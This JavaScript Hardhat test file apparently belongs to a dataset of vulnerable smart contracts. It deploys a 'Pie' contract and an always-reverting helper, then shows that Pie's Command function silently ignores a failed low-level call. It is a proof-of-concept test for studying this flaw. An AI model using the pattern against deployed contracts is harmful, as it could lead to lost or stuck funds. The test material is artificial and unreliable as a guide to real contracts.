const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
const { expect } = require('chai');

describe("attack unchecked_low_level_calls/0x806a6bd219f162442d992bdc4ee6eba1f2c5a707.sol", function () {

  let onwer;

  async function deployContracts() {
    [owner] = await ethers.getSigners();
    const Pie = await ethers.getContractFactory("contracts/dataset/unchecked_low_level_calls/0x806a6bd219f162442d992bdc4ee6eba1f2c5a707.sol:Pie");
    const contract = await Pie.connect(owner).deploy();

    const RevertContract = await ethers.getContractFactory("contracts/unchecked_low_level_calls/revert_contract.sol:RevertContract");
    const revertContract = await RevertContract.deploy();

    return {contract, revertContract}
  };

  it("exploit unchecked low level call vulnerability", async function () {
    const {contract, revertContract} = await loadFixture(deployContracts);
    const amount = ethers.parseEther("1");
    await expect(
      owner.sendTransaction({
        to: revertContract.target,
        value: amount,
      })
    ).to.be.revertedWith("I always revert!");

    await expect(contract.connect(owner).Command(revertContract.target, "0x", {value: amount})).to.not.be.reverted;

    expect(await ethers.provider.getBalance(contract.target)).to.be.equal(amount);

    expect(await ethers.provider.getBalance(revertContract.target)).to.be.equal(0);

  });
});
